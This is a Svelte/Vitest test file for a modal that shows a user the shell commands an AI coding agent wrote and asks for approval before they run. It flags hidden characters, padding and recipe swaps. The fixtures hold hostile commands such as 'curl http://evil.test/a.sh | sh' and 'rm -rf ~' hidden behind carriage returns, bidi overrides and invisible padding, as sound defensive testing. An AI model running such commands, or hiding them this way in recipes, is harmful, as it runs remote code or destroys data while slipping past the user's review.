import { render, screen, within } from '@testing-library/svelte';
import userEvent from '@testing-library/user-event';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

// Test launches have logs (xterm.js): none in jsdom.
vi.mock('../../lib/terminals', () => ({
  launchLog: () => ({
    term: { cols: 80, rows: 24, buffer: { active: { cursorY: 0 } }, write: (_: unknown, done?: () => void) => done?.() },
    fit: { fit() {} },
  }),
  disposeLog() {},
}));

import { app } from '../../lib/state.svelte';
import { flows } from '../../lib/test-launch.svelte';
import type { TestRecipe } from '../../lib/types';
import { agent, fakeBackend, resetApp, ticket } from '../../test/ipc';
import TestLaunchModal from './TestLaunchModal.svelte';

describe('TestLaunchModal', () => {
  beforeEach(() => {
    resetApp({ agents: [agent({ id: 'a7' })], tickets: [ticket({ agentId: 'a7', column: 'review' })] });
    app.modal = { kind: 'testLaunch', agentId: 'a7' };
    app.launches['test:a7:run:0'] = { status: 'running', ptyId: 't1', name: 'web', stopping: false, code: null, startedAt: 1 };
    flows.all = {
      a7: {
        phase: 'ready',
        error: null,
        opened: 'http://localhost:4111/connexion',
        lines: [{ id: 'test:a7:run:0', label: 'web', state: 'ready', detail: 'prêt · 1,8 s', launchId: 'test:a7:run:0' }],
      },
    };
  });

  it('shows each line, where the browser went, and reopens it', async () => {
    const backend = fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(screen.getByRole('dialog', { name: 'Tester DEM-1' })).toBeInTheDocument();
    expect(screen.getByText('prêt · 1,8 s')).toBeInTheDocument();
    expect(screen.getByText(/Ouvert dans le navigateur/)).toHaveTextContent('Ouvert dans le navigateur : http://localhost:4111/connexion');
    await userEvent.click(screen.getByRole('button', { name: 'Rouvrir' }));
    expect(backend.called('plugin:opener|open_url')[0].args.url).toBe('http://localhost:4111/connexion');
  });

  it('stops everything, or shows the log of a step', async () => {
    const backend = fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    await userEvent.click(screen.getByRole('button', { name: 'Tout arrêter' }));
    expect(backend.called('term_kill')[0].args).toEqual({ id: 't1' });
    await userEvent.click(screen.getByRole('button', { name: 'Voir les logs' }));
    expect(app.selectedLaunch.p1).toBe('test:a7:run:0');
    expect(app.modal).toBeNull();
  });

  it('says it is stopped once everything is, with nothing left to reopen', async () => {
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    await userEvent.click(screen.getByRole('button', { name: 'Tout arrêter' }));
    expect(screen.getByText('Arrêté')).toBeInTheDocument();
    expect(screen.getByText('arrêté')).toBeInTheDocument();
    expect(screen.queryByRole('button', { name: 'Rouvrir' })).not.toBeInTheDocument();
    expect(screen.queryByText(/Ouvert dans le navigateur/)).not.toBeInTheDocument();
  });

  it('names the agent when it has no ticket', () => {
    resetApp({ agents: [agent({ id: 'a7', name: 'refacto-auth' })] });
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(screen.getByRole('dialog', { name: 'Tester refacto-auth' })).toBeInTheDocument();
  });

  it('offers the log of a step that failed, and the reason of one that could not start, which has none', async () => {
    fakeBackend();
    app.launches['test:a7:prep:0'] = { status: 'crashed', ptyId: null, name: 'Préparation 1', stopping: false, code: 2, startedAt: 1 };
    flows.all.a7 = {
      phase: 'failed',
      error: "« web » n'a pas pu démarrer",
      opened: null,
      lines: [
        { id: 'test:a7:prep:0', label: 'Préparation : npm install', state: 'failed', detail: 'code 2', launchId: 'test:a7:prep:0' },
        { id: 'test:a7:run:1', label: 'web', state: 'failed', detail: 'Validation en cours', launchId: 'test:a7:run:1' },
      ],
    };
    render(TestLaunchModal, { agentId: 'a7' });
    const lines = within(screen.getByRole('list', { name: 'Étapes du lancement' })).getAllByRole('listitem');
    expect(within(lines[1]).getByText('Validation en cours')).toBeInTheDocument();
    expect(within(lines[1]).queryByRole('button', { name: 'Voir le log' })).not.toBeInTheDocument();
    expect(screen.getByText("« web » n'a pas pu démarrer")).toBeInTheDocument();
    await userEvent.click(within(lines[0]).getByRole('button', { name: 'Voir le log' }));
    expect(app.selectedLaunch.p1).toBe('test:a7:prep:0');
    expect(app.modal).toBeNull();
  });

  it('says the recipe changed when the test it showed was dropped for a new one', async () => {
    const recipe = { prepare: [], processes: [{ name: 'web', command: 'node web.js', dir: '', env: {}, url: '' }], open: '' };
    // One the user approved (a recipe not approved shows itself, to be read: see below).
    app.agents.a7 = { ...app.agents.a7, recipe, approvedRecipe: recipe };
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(screen.queryByText('La recette a changé : relance ▶ Tester.')).not.toBeInTheDocument();
    // What the window does when the agent sends another recipe.
    delete flows.all.a7;
    expect(await screen.findByText('La recette a changé : relance ▶ Tester.')).toBeInTheDocument();
    expect(screen.queryByRole('list', { name: 'Étapes du lancement' })).not.toBeInTheDocument();
  });

  it('has no logs to show before any step ran', () => {
    fakeBackend();
    app.launches = {};
    flows.all = {};
    render(TestLaunchModal, { agentId: 'a7' });
    expect(screen.getByRole('button', { name: 'Voir les logs' })).toBeDisabled();
  });

  it('closes, leaving the servers running', async () => {
    const backend = fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    const dialog = screen.getByRole('dialog');
    await userEvent.click(within(dialog.querySelector('.foot') as HTMLElement).getByRole('button', { name: 'Fermer' }));
    expect(app.modal).toBeNull();
    expect(backend.called('term_kill')).toHaveLength(0);
    expect(app.launches['test:a7:run:0'].status).toBe('running');
  });
});

describe('TestLaunchModal, a recipe to read before it runs', () => {
  const RECIPE: TestRecipe = {
    prepare: [{ command: 'npm install', dir: 'web' }],
    processes: [
      { name: 'web', command: 'npm run dev -- --port 4121', dir: 'web', env: { PORT: '4121' }, url: 'http://localhost:4121' },
      { name: '', command: 'node worker.js', dir: '', env: {}, url: '' },
    ],
    open: 'http://localhost:4121/connexion',
  };
  /** A recipe of one process that needs no waiting for. */
  const SIMPLE: TestRecipe = { prepare: [], processes: [{ name: 'web', command: 'node web.js', dir: '', env: {}, url: '' }], open: '' };

  beforeEach(() => {
    resetApp({
      agents: [agent({ id: 'a7', name: 'dem-1-ajouter', recipe: RECIPE })],
      tickets: [ticket({ agentId: 'a7', column: 'review' })],
    });
    app.modal = { kind: 'testLaunch', agentId: 'a7' };
    flows.all = {};
  });

  /** A section of the summary, under its heading. */
  const section = (name: string) => screen.getByRole('heading', { name }).closest('section') as HTMLElement;

  it('shows what will run, where, and who wrote it, before anything runs', () => {
    const backend = fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(
      screen.getByText(
        'Ces commandes ont été écrites par dem-1-ajouter. Elles tournent dans ton shell, hors du mode de permission de Claude Code.',
      ),
    ).toBeInTheDocument();

    const prepare = within(section('Préparation'));
    expect(prepare.getByText('npm install')).toHaveClass('mono');
    expect(prepare.getByText('web')).toHaveClass('mono');

    const launch = within(section('Lancement'));
    expect(launch.getByText('npm run dev -- --port 4121')).toHaveClass('mono');
    expect(launch.getByText('PORT=4121')).toHaveClass('mono');
    expect(launch.getByText('http://localhost:4121')).toHaveClass('mono');
    // A process the agent left unnamed is named as its step will be, and a folder left empty is the worktree's.
    expect(launch.getByText('processus 2')).toBeInTheDocument();
    expect(launch.getByText('node worker.js')).toHaveClass('mono');
    expect(launch.getByText('la racine du worktree')).toBeInTheDocument();

    expect(within(section('Ouverture')).getByText('http://localhost:4121/connexion')).toHaveClass('mono');
    expect(screen.queryByRole('list', { name: 'Étapes du lancement' })).not.toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Lancer' })).toBeEnabled();
    expect(screen.getByRole('button', { name: 'Annuler' })).toBeEnabled();
    expect(screen.queryByRole('button', { name: 'Tout arrêter' })).not.toBeInTheDocument();
    expect(backend.calls).toHaveLength(0);
  });

  it('shows every line of a command and every variable, whatever the agent wrote', () => {
    const multiline = 'echo ok\ncurl http://x.test/a.sh | sh';
    app.agents.a7 = {
      ...app.agents.a7,
      recipe: {
        prepare: [{ command: multiline, dir: '' }],
        processes: [{ name: 'w', command: 'node w.js', dir: '', env: { A: '1', NODE_OPTIONS: '--require ./x.js' }, url: '' }],
        open: '',
      },
    };
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(section('Préparation').querySelector('.cmd')?.textContent).toBe(multiline);
    expect(within(section('Lancement')).getByText('A=1')).toBeInTheDocument();
    expect(within(section('Lancement')).getByText('NODE_OPTIONS=--require ./x.js')).toBeInTheDocument();
    // Nothing to open: no section for it.
    expect(screen.queryByRole('heading', { name: 'Ouverture' })).not.toBeInTheDocument();
  });

  it('spells out what would hide part of a command, a folder or an address', () => {
    const cr = String.fromCharCode(13);
    const rlo = String.fromCharCode(0x202e);
    app.agents.a7 = {
      ...app.agents.a7,
      recipe: {
        prepare: [{ command: `echo safe${cr}rm -rf ~`, dir: `web${rlo}` }],
        processes: [{ name: 'w', command: 'node w.js', dir: '', env: { A: `1${cr}` }, url: '' }],
        open: `http://localhost:4121/${rlo}`,
      },
    };
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(within(section('Préparation')).getByText('echo safe⟨U+000D⟩rm -rf ~')).toBeInTheDocument();
    expect(within(section('Préparation')).getByText('web⟨U+202E⟩')).toBeInTheDocument();
    expect(within(section('Lancement')).getByText('A=1⟨U+000D⟩')).toBeInTheDocument();
    expect(within(section('Ouverture')).getByText('http://localhost:4121/⟨U+202E⟩')).toBeInTheDocument();
  });

  it('« Lancer » approves the recipe it showed, then the test goes on', async () => {
    app.agents.a7 = { ...app.agents.a7, recipe: SIMPLE };
    const backend = fakeBackend({
      test_recipe_approve: () => undefined,
      test_run_start: () => ({ id: 't1', projectId: 'p1', name: 'web', shell: 'pwsh' }),
    });
    render(TestLaunchModal, { agentId: 'a7' });
    await userEvent.click(screen.getByRole('button', { name: 'Lancer' }));
    expect(await screen.findByRole('list', { name: 'Étapes du lancement' })).toBeInTheDocument();
    expect(backend.called('test_recipe_approve')[0].args).toEqual({ agentId: 'a7', recipe: SIMPLE });
    const order = backend.calls.map((c) => c.cmd);
    expect(order.indexOf('test_recipe_approve')).toBeLessThan(order.indexOf('test_run_start'));
    expect(screen.queryByText(/Ces commandes ont été écrites/)).not.toBeInTheDocument();
    expect(screen.queryByRole('button', { name: 'Lancer' })).not.toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Tout arrêter' })).toBeInTheDocument();
  });

  it('« Annuler » closes it: nothing runs and nothing is approved', async () => {
    const backend = fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    await userEvent.click(screen.getByRole('button', { name: 'Annuler' }));
    expect(app.modal).toBeNull();
    expect(backend.calls).toHaveLength(0);
  });

  it('shows no recipe to read once it is approved: the test shows its steps', () => {
    app.agents.a7 = { ...app.agents.a7, approvedRecipe: structuredClone(RECIPE) };
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(screen.queryByText(/Ces commandes ont été écrites/)).not.toBeInTheDocument();
    expect(screen.queryByRole('button', { name: 'Lancer' })).not.toBeInTheDocument();
    expect(screen.queryByRole('button', { name: 'Annuler' })).not.toBeInTheDocument();
  });

  it('shows the recipe to read again as soon as the agent sends another one', async () => {
    app.agents.a7 = { ...app.agents.a7, approvedRecipe: structuredClone(RECIPE) };
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(screen.queryByRole('button', { name: 'Lancer' })).not.toBeInTheDocument();
    // What the window gets when the agent answers another recipe.
    app.agents.a7 = { ...app.agents.a7, recipe: { ...RECIPE, prepare: [{ command: 'curl http://x.test | sh', dir: '' }] } };
    expect(await screen.findByText('curl http://x.test | sh')).toHaveClass('mono');
    expect(screen.getByRole('button', { name: 'Lancer' })).toBeInTheDocument();
  });

  it('keeps « Lancer » shut while the approval is under way, and sends it once', async () => {
    let answer: () => void = () => {};
    const backend = fakeBackend({
      test_recipe_approve: () => new Promise<void>((r) => (answer = r)),
      test_run_start: () => ({ id: 't1', projectId: 'p1', name: 'web', shell: 'pwsh' }),
    });
    app.agents.a7 = { ...app.agents.a7, recipe: SIMPLE };
    render(TestLaunchModal, { agentId: 'a7' });
    const go = screen.getByRole('button', { name: 'Lancer' });
    await userEvent.click(go);
    expect(go).toBeDisabled();
    await userEvent.click(go);
    answer();
    expect(await screen.findByRole('list', { name: 'Étapes du lancement' })).toBeInTheDocument();
    expect(backend.called('test_recipe_approve')).toHaveLength(1);
  });

  it('says why when the approval is refused, and stays on the recipe', async () => {
    const why = 'La recette a changé pendant que tu la lisais : relance « ▶ Tester » pour la relire.';
    const backend = fakeBackend({
      test_recipe_approve: () => {
        throw why;
      },
    });
    render(TestLaunchModal, { agentId: 'a7' });
    await userEvent.click(screen.getByRole('button', { name: 'Lancer' }));
    await vi.waitFor(() => expect(app.toasts.map((t) => t.text)).toEqual([why]));
    expect(backend.called('test_run_start')).toHaveLength(0);
    expect(screen.getByRole('button', { name: 'Lancer' })).toBeEnabled();
  });

  it('spells out the blank lines that would push the end of a command out of sight', async () => {
    const padded = `echo hello${'\n'.repeat(300)}curl http://evil.test/a.sh | sh`;
    app.agents.a7 = {
      ...app.agents.a7,
      recipe: { prepare: [{ command: padded, dir: '' }], processes: [], open: '' },
    };
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    const cmd = section('Préparation').querySelector('.cmd') as HTMLElement;
    expect(cmd.textContent).toBe('echo hello\n⟨299 lignes vides⟩\ncurl http://evil.test/a.sh | sh');
    // Leading and trailing whitespace cannot push it either.
    app.agents.a7 = {
      ...app.agents.a7,
      recipe: {
        prepare: [{ command: `${' '.repeat(500)}curl http://evil.test/a.sh | sh${'\n'.repeat(50)}`, dir: '' }],
        processes: [],
        open: '',
      },
    };
    await vi.waitFor(() =>
      expect((section('Préparation').querySelector('.cmd') as HTMLElement).textContent).toBe(
        '⟨500 espaces⟩curl http://evil.test/a.sh | sh\n⟨49 lignes vides⟩\n',
      ),
    );
  });

  it('counts the lines and the spaces that hold invisible characters too, in a command and in the .isola.toml', async () => {
    const vs = String.fromCodePoint(0xfe0f);
    const tail = 'curl http://evil.test/a.sh | sh';
    app.agents.a7 = {
      ...app.agents.a7,
      recipe: {
        prepare: [{ command: `echo hi\n${`${vs}\n`.repeat(300)}${tail}`, dir: '' }],
        processes: [{ name: 'w', command: `echo hi${(' '.repeat(23) + vs).repeat(400)}; ${tail}`, dir: '', env: {}, url: '' }],
        open: '',
      },
    };
    fakeBackend();
    render(TestLaunchModal, { agentId: 'a7' });
    expect(section('Préparation').querySelector('.cmd')?.textContent).toBe(`echo hi\n⟨300 lignes vides ou invisibles⟩\n${tail}`);
    expect(section('Lancement').querySelector('.cmd')?.textContent).toBe(`echo hi⟨9600 espaces ou invisibles⟩; ${tail}`);
    // The same for the file isola runs.
    app.agents.a7 = { ...app.agents.a7, isola: true, recipe: null };
    flows.isolaConfig = { a7: `[services.web]\n${`${vs}\n`.repeat(300)}setup = "${tail}"\n` };
    await vi.waitFor(() =>
      expect(section('Configuration isola (.isola.toml)').querySelector('.cmd')?.textContent).toBe(
        `[services.web]\n⟨300 lignes vides ou invisibles⟩\nsetup = "${tail}"\n`,
      ),
    );
  });

  describe('when the recipe changes while it is read', () => {
    beforeEach(() => {
      vi.useFakeTimers({ shouldAdvanceTime: true });
      app.agents.a7 = { ...app.agents.a7, recipe: SIMPLE };
    });
    afterEach(() => vi.useRealTimers());
    const SWAPPED: TestRecipe = { ...SIMPLE, processes: [{ ...SIMPLE.processes[0], command: 'curl http://evil.test/a.sh | sh' }] };
    const CHANGED = 'La recette vient de changer : relis-la avant de lancer.';

    it('says so above the new recipe, and keeps « Lancer » shut for a moment', async () => {
      const backend = fakeBackend({
        test_recipe_approve: () => undefined,
        test_run_start: () => ({ id: 't1', projectId: 'p1', name: 'web', shell: 'pwsh' }),
      });
      render(TestLaunchModal, { agentId: 'a7' });
      expect(screen.queryByText(CHANGED)).not.toBeInTheDocument();
      expect(screen.getByRole('button', { name: 'Lancer' })).toBeEnabled();

      app.agents.a7 = { ...app.agents.a7, recipe: SWAPPED };
      const notice = await screen.findByText(CHANGED);
      // Above the summary, which is the new recipe.
      expect(
        notice.compareDocumentPosition(screen.getByText('curl http://evil.test/a.sh | sh')) & Node.DOCUMENT_POSITION_FOLLOWING,
      ).toBeTruthy();
      expect(screen.getByRole('button', { name: 'Lancer' })).toBeDisabled();
      await vi.advanceTimersByTimeAsync(900);
      expect(screen.getByRole('button', { name: 'Lancer' })).toBeDisabled();
      await vi.advanceTimersByTimeAsync(200);
      expect(screen.getByRole('button', { name: 'Lancer' })).toBeEnabled();
      // The notice stays: the user clicks « Lancer » again, and it approves the recipe now shown.
      expect(screen.getByText(CHANGED)).toBeInTheDocument();
      await userEvent.click(screen.getByRole('button', { name: 'Lancer' }));
      expect(backend.called('test_recipe_approve')[0].args).toEqual({ agentId: 'a7', recipe: SWAPPED });
    });

    it('does not take another update of the agent for a change', async () => {
      fakeBackend();
      render(TestLaunchModal, { agentId: 'a7' });
      app.agents.a7 = { ...app.agents.a7, tokens: 1234, recipe: structuredClone(SIMPLE) };
      await vi.advanceTimersByTimeAsync(10);
      expect(screen.queryByText(CHANGED)).not.toBeInTheDocument();
      expect(screen.getByRole('button', { name: 'Lancer' })).toBeEnabled();
    });

    it('says so too when a test under way is dropped for another recipe', async () => {
      flows.all = { a7: { phase: 'running', error: null, opened: null, lines: [] } };
      fakeBackend();
      app.agents.a7 = { ...app.agents.a7, approvedRecipe: SIMPLE };
      render(TestLaunchModal, { agentId: 'a7' });
      expect(screen.queryByRole('button', { name: 'Lancer' })).not.toBeInTheDocument();
      // What the window does when the agent sends another recipe.
      app.agents.a7 = { ...app.agents.a7, recipe: SWAPPED };
      delete flows.all.a7;
      expect(await screen.findByText(CHANGED)).toBeInTheDocument();
      expect(screen.getByRole('button', { name: 'Lancer' })).toBeDisabled();
    });
  });

  describe('for an agent whose services isola runs', () => {
    const CONFIG = '[services.web]\ncommand = "npm run dev"\nsetup = "npm ci"\n';
    beforeEach(() => {
      app.agents.a7 = { ...app.agents.a7, isola: true, recipe: { prepare: [], processes: [], open: 'http://localhost:3117/connexion' } };
      flows.isolaConfig = { a7: CONFIG };
    });

    it('shows the .isola.toml it will run and the address to open, before anything runs', () => {
      const backend = fakeBackend();
      render(TestLaunchModal, { agentId: 'a7' });
      expect(
        screen.getByText(/isola lance les commandes de ce fichier dans ton shell, hors du mode de permission de Claude Code/),
      ).toBeInTheDocument();
      expect(screen.getByText(/dem-1-ajouter peut l’avoir écrit ou modifié/)).toBeInTheDocument();
      const config = within(section('Configuration isola (.isola.toml)')).getByText(/\[services\.web\]/);
      expect(config).toHaveClass('mono');
      expect(config.textContent).toBe(CONFIG);
      expect(within(section('Ouverture')).getByText('http://localhost:3117/connexion')).toHaveClass('mono');
      expect(screen.queryByRole('heading', { name: 'Préparation' })).not.toBeInTheDocument();
      expect(screen.getByRole('button', { name: 'Lancer' })).toBeEnabled();
      expect(screen.getByRole('button', { name: 'Annuler' })).toBeEnabled();
      expect(backend.calls).toHaveLength(0);
    });

    it('waits for the file to be read, with nothing to approve yet', () => {
      flows.isolaConfig = {};
      fakeBackend();
      render(TestLaunchModal, { agentId: 'a7' });
      expect(screen.getByText('Lecture du .isola.toml…')).toBeInTheDocument();
      expect(screen.queryByRole('button', { name: 'Lancer' })).not.toBeInTheDocument();
      expect(screen.queryByText('La recette a changé : relance ▶ Tester.')).not.toBeInTheDocument();
    });

    it('spells out what hides in the file, but takes a Windows line ending for a line break', () => {
      flows.isolaConfig = { a7: `setup = "a"\r\ncommand = "b${String.fromCharCode(0x202e)}"\r\n` };
      fakeBackend();
      render(TestLaunchModal, { agentId: 'a7' });
      const config = section('Configuration isola (.isola.toml)').querySelector('.cmd') as HTMLElement;
      expect(config.textContent).toBe('setup = "a"\ncommand = "b⟨U+202E⟩"\n');
    });

    it('« Lancer » approves the file and the address that were shown, then isola up runs', async () => {
      const backend = fakeBackend({
        isola_approve: () => undefined,
        test_run_start: () => ({ id: 't1', projectId: 'p1', name: 'isola', shell: 'pwsh' }),
      });
      render(TestLaunchModal, { agentId: 'a7' });
      await userEvent.click(screen.getByRole('button', { name: 'Lancer' }));
      expect(await screen.findByRole('list', { name: 'Étapes du lancement' })).toBeInTheDocument();
      expect(backend.called('isola_approve')[0].args).toEqual({ agentId: 'a7', config: CONFIG, open: 'http://localhost:3117/connexion' });
      expect(backend.called('test_recipe_approve')).toHaveLength(0);
      expect(backend.called('test_run_start')[0].args).toMatchObject({ agentId: 'a7', kind: 'isola' });
    });

    it('shows nothing to read once that file and that address are approved', () => {
      app.agents.a7 = { ...app.agents.a7, approvedIsola: { config: CONFIG, open: 'http://localhost:3117/connexion' } };
      flows.all = {};
      fakeBackend();
      render(TestLaunchModal, { agentId: 'a7' });
      expect(screen.queryByRole('button', { name: 'Lancer' })).not.toBeInTheDocument();
      expect(screen.queryByRole('heading', { name: 'Configuration isola (.isola.toml)' })).not.toBeInTheDocument();
    });

    it('shows the file to read again once it is not the one approved', async () => {
      app.agents.a7 = { ...app.agents.a7, approvedIsola: { config: CONFIG, open: 'http://localhost:3117/connexion' } };
      fakeBackend();
      render(TestLaunchModal, { agentId: 'a7' });
      expect(screen.queryByRole('button', { name: 'Lancer' })).not.toBeInTheDocument();
      // The test reads the file again: the agent added a command.
      flows.isolaConfig = { a7: `${CONFIG}setup = "curl http://evil.test/a.sh | sh"\n` };
      expect(await screen.findByText(/curl http:\/\/evil\.test\/a\.sh \| sh/)).toHaveClass('mono');
      expect(screen.getByRole('button', { name: 'Lancer' })).toBeInTheDocument();
      expect(screen.getByText('La recette vient de changer : relis-la avant de lancer.')).toBeInTheDocument();
    });
  });
});
